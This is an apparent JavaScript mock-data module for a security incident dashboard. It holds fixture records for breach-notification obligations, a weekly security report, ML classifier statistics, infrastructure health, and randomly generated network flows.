    { id: uuid(503), incident_id: uuid(103), regulation: 'GDPR', jurisdiction: 'EU/EEA', obligation: 'Notify supervisory authority within 72 hours', deadline: daysAgo(1), is_met: true, met_at: daysAgo(1), notes: 'DPC notified via online portal. Reference: IE-2024-001-XSS', created_at: daysAgo(2) },
    { id: uuid(504), incident_id: uuid(103), regulation: 'GDPR', jurisdiction: 'EU/EEA', obligation: 'Document incident in data breach register', deadline: daysAgo(1), is_met: true, met_at: daysAgo(1), notes: 'Added to breach register entry #BR-2024-003', created_at: daysAgo(2) },
    { id: uuid(505), incident_id: uuid(108), regulation: 'GDPR', jurisdiction: 'EU/EEA', obligation: 'Notify supervisory authority within 72 hours', deadline: new Date(Date.now() + 66 * 3600_000).toISOString(), is_met: false, met_at: null, notes: null, created_at: daysAgo(6) },
    { id: uuid(506), incident_id: uuid(108), regulation: 'HIPAA', jurisdiction: 'United States', obligation: 'Notify HHS Secretary within 60 days', deadline: new Date(Date.now() + 54 * 24 * 3600_000).toISOString(), is_met: false, met_at: null, notes: null, created_at: daysAgo(6) },
    { id: uuid(507), incident_id: uuid(111), regulation: 'GDPR', jurisdiction: 'EU/EEA', obligation: 'Notify supervisory authority within 72 hours', deadline: daysAgo(7), is_met: true, met_at: daysAgo(8), notes: 'Notified DPC within 48 hours. No data confirmed exfiltrated.', created_at: daysAgo(9) },
    { id: uuid(508), incident_id: uuid(115), regulation: 'GDPR', jurisdiction: 'EU/EEA', obligation: 'Assess impact on data subjects', deadline: daysAgo(11), is_met: true, met_at: daysAgo(12), notes: 'DDoS attack — no personal data was accessed or exfiltrated. Low impact to data subjects.', created_at: daysAgo(14) },
    { id: uuid(509), incident_id: uuid(120), regulation: 'DPDPA', jurisdiction: 'India', obligation: 'Notify Data Protection Board within 72 hours', deadline: daysAgo(17), is_met: true, met_at: daysAgo(18), notes: 'DPB notified. No personal data confirmed compromised. Package was quarantined before execution.', created_at: daysAgo(20) },
  ],
}

// ── Weekly Report ─────────────────────────────────────────────────────────────
export const MOCK_WEEKLY_REPORT = {
  generated_at: new Date().toISOString(),
  period_start: new Date(Date.now() - 7 * 86_400_000).toISOString(),
  period_end:   new Date().toISOString(),
  security_score: 68,
  security_grade: 'C+',
  security_color: '#f59e0b',
  security_status: 'NEEDS ATTENTION',
  executive_summary: 'This week saw 8 new security incidents, including two critical events requiring immediate attention: a credential stuffing campaign targeting the authentication endpoint and a suspected insider data exfiltration incident. The SQL injection campaign on the login API was successfully blocked by WAF rules and has been assigned for investigation. The dependency confusion attack from last week was resolved with no production impact. Overall security score declined 4 points from last week (72 → 68) due to the two unassigned critical incidents.',
  total_incidents: 8,
  incidents: {
    open_critical: 2,
    open_high: 3,
    open_medium: 1,
    open_low: 0,
    new_this_week: 8,
    closed_this_week: 5,
    top_attack_types: [
      { category: 'BRUTE_FORCE', count: 2 },
      { category: 'SQL_INJECTION', count: 1 },
      { category: 'DATA_EXFILTRATION', count: 1 },
      { category: 'XSS', count: 1 },
      { category: 'IDOR', count: 1 },
    ],
    most_targeted_ports: [
      { port: 443, count: 7 },
      { port: 80, count: 1 },
    ],
    critical_incidents: [
      { id: uuid(101), title: 'SQL Injection on /api/v1/auth/login', severity: 'critical', status: 'investigating', created_at: hoursAgo(3) },
      { id: uuid(102), title: 'Credential Stuffing — Auth Endpoint', severity: 'critical', status: 'open', created_at: hoursAgo(6) },
      { id: uuid(108), title: 'Suspicious Data Exfiltration — Evidence API', severity: 'critical', status: 'open', created_at: daysAgo(6) },
    ],
    resolved_incidents: [
      { id: uuid(103), title: 'Stored XSS in Incident Comment Field', severity: 'high', resolved_at: daysAgo(1) },
      { id: uuid(107), title: 'JWT Signature Bypass Attempt', severity: 'high', resolved_at: daysAgo(4) },
      { id: uuid(111), title: 'RCE Attempt via Log4Shell Variant', severity: 'critical', resolved_at: daysAgo(8) },
    ],
  },
  evidence_count: 8,
  compliance_met: 12,
  compliance_total: 18,
  top_recommendations: [
    { priority: 'high', title: 'Assign critical incidents #102 and #108 immediately', detail: 'Both incidents have been open without analyst assignment for over 6 hours.' },
    { priority: 'high', title: 'Submit GDPR notification for incident #101 before deadline', detail: 'The 72-hour DPC notification window expires in approximately 14 hours.' },
    { priority: 'medium', title: 'Enable MFA for analyst accounts', detail: '3 analyst accounts lack MFA. Enforce TOTP or passkey across all analyst and admin roles.' },
  ],
  trend: 'worsening',
  trend_reason: 'Two unresolved critical incidents and declining security score from 72 to 68 this week.',
}

// ── ML Stats ──────────────────────────────────────────────────────────────────
export const MOCK_ML_STATS = {
  active_model: {
    model_id: 'lbro-rf-v2.4.1',
    version: '2.4.1',
    trained_at: daysAgo(7),
    accuracy: 0.961,
    f1_score: 0.961,
    is_active: true,
    feature_count: 78,
    class_count: 10,
  },
  registry: [
    { model_id: 'lbro-rf-v2.4.1', version: '2.4.1', trained_at: daysAgo(7),  accuracy: 0.961, f1_score: 0.961, is_active: true,  feature_count: 78, class_count: 10 },
    { model_id: 'lbro-rf-v2.3.0', version: '2.3.0', trained_at: daysAgo(45), accuracy: 0.947, f1_score: 0.944, is_active: false, feature_count: 72, class_count: 10 },
    { model_id: 'lbro-rf-v2.2.1', version: '2.2.1', trained_at: daysAgo(90), accuracy: 0.931, f1_score: 0.929, is_active: false, feature_count: 68, class_count: 9  },
  ],
  predictions_today: 234,
  avg_confidence: 0.887,
  low_confidence_count: 12,
  attack_distribution: {
    BENIGN: 3102, BRUTE_FORCE: 611, PORT_SCAN: 498, SQL_INJECTION: 287,
    XSS: 201, DoS: 148, RCE: 47, SSRF: 35, IDOR: 28, DATA_EXFILTRATION: 19,
  },
  top_features: [
    { name: 'Flow Duration',          importance: 0.142 },
    { name: 'Bwd Packet Length Max',  importance: 0.118 },
    { name: 'Fwd IAT Mean',           importance: 0.097 },
    { name: 'Packet Length Variance', importance: 0.084 },
    { name: 'Fwd Packet Length Mean', importance: 0.079 },
    { name: 'Flow IAT Std',           importance: 0.071 },
    { name: 'Init Win Bytes Bwd',     importance: 0.063 },
    { name: 'Subflow Fwd Bytes',      importance: 0.058 },
    { name: 'PSH Flag Count',         importance: 0.049 },
    { name: 'Avg Fwd Segment Size',   importance: 0.041 },
  ],
}

// ── Infrastructure / SQS ─────────────────────────────────────────────────────
export const MOCK_INFRASTRUCTURE = {
  sqs_queue_depth: 3,
  sqs_oldest_message_age_s: 142,
  worker_count: 2,
  worker_status: 'healthy',
  db_pool_used: 4,
  db_pool_max: 20,
  redis_connected: true,
  s3_reachable: true,
  api_latency_p99_ms: 184,
  last_healthcheck: new Date().toISOString(),
}

export const MOCK_SQS_HISTORY = Array.from({ length: 24 }, (_, i) => ({
  time: new Date(Date.now() - (23 - i) * 3600_000).toISOString().slice(11, 16),
  incident:     Math.floor(Math.random() * 6),
  containment:  Math.floor(Math.random() * 4),
  notification: Math.floor(Math.random() * 3),
}))

// ── ML Model Info + Flows ─────────────────────────────────────────────────────
export const MOCK_ML_MODEL_INFO = {
  model_id:      'lbro-rf-v2.4.1',
  version:       '2.4.1',
  trained_at:    daysAgo(7),
  accuracy:      0.961,
  f1_score:      0.961,
  is_active:     true,
  feature_count: 78,
  class_count:   10,
}

export const MOCK_ML_FLOWS = Array.from({ length: 50 }, (_, i) => {
  const cats = ['BENIGN','BRUTE_FORCE','PORT_SCAN','SQL_INJECTION','XSS','DoS','RCE','SSRF','IDOR','DATA_EXFILTRATION']
  const cat  = i % 7 === 0 ? cats[Math.floor(Math.random() * (cats.length - 1)) + 1] : 'BENIGN'
  return {
    id: `flow-${String(i + 1).padStart(4,'0')}`,
    source_ip:   `192.168.${Math.floor(i / 10)}.${i % 255}`,
    dest_ip:     `10.0.1.${(i % 10) + 1}`,
    source_port: 30000 + i,
    dest_port:   [80, 443, 22, 3306, 5432][i % 5],
    protocol:    ['TCP','UDP','HTTPS'][i % 3],
    flow_duration_ms: Math.floor(Math.random() * 5000),
    packet_count:     Math.floor(Math.random() * 200) + 1,
    byte_count:       Math.floor(Math.random() * 100_000),
    prediction:       cat,
    confidence:       Number((0.82 + Math.random() * 0.17).toFixed(3)),
    is_anomaly:       cat !== 'BENIGN',
    captured_at:      hoursAgo(Math.floor(Math.random() * 24)),
  }
})
